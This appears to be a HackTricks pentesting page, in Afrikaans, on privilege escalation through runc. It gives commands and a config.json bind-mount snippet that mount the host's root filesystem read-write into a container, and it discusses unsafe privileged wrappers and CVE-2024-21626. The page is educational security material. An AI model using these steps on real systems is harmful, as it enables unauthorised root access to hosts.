# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Basiese inligting

As jy meer oor **runc** wil leer, kyk na die volgende bladsy:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

As `runc` beskikbaar is vir ’n rootful-proses op die host, kan jy ’n OCI-bundel gebruik waarvan die mount-konfigurasie die host se `/` rekursief as ’n bind-mount by `/` binne die container mount, sodat die host-lêerstelsel in daardie mount namespace blootgestel word.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> Die gedokumenteerde `runc run`-werkvloei is rootful: runc se eie voorbeelde beskryf dit as "run as root." ’n Onbevoorregte gebruiker benodig ’n rootless-opstelling, soos `runc spec --rootless`, en runc dokumenteer dat user namespaces vir dié modus geaktiveer moet wees.<sup>[[1]](#references)</sup>

## Bevoorregte wrappers en runtime-weergawes

’n Bevoorregte wrapper wat ’n oproeper-beheerde OCI-bundel aanvaar, kan gasheerlêers blootstel as dit onveilige bind mounts toelaat. Kontroleer of die wrapper traversal en symlinks oplos voordat dit mount-bronne en -bestemmings valideer, en of dit `process.cwd` beperk. ’n sudo-reël of ’n skryfbare `config.json` bewys op sigself nie dat die wrapper die bundel sal aanvaar of dit met gasheerregte sal uitvoer nie.

Afsonderlik het [CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv) upstream `runc`-weergawes van `1.0.0-rc93` tot en met `1.1.11` geraak; `1.1.12` bevat die upstream-regstelling. Leaked lêerbeskrywers en onvoldoende validering van die werkgids kon veroorsaak dat ’n container-proses tydens sekere `runc run`- of `runc exec`-werkvloeie buite sy root beland. Lêerbeskrywergetalle hang van die aanroep af, en ’n weergawe-string bewys nie dat die kwesbaarheid uitbuitbaar is wanneer ’n vendor regstellings teruggeporteer het of die oproeper nie ’n bevoorregte runtime-aanroep kan beïnvloed nie.

## References

- [1] [runc: CLI-nutsding om containers te skep en uit te voer](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI Runtime Specification: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Gedeelde subtrees](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
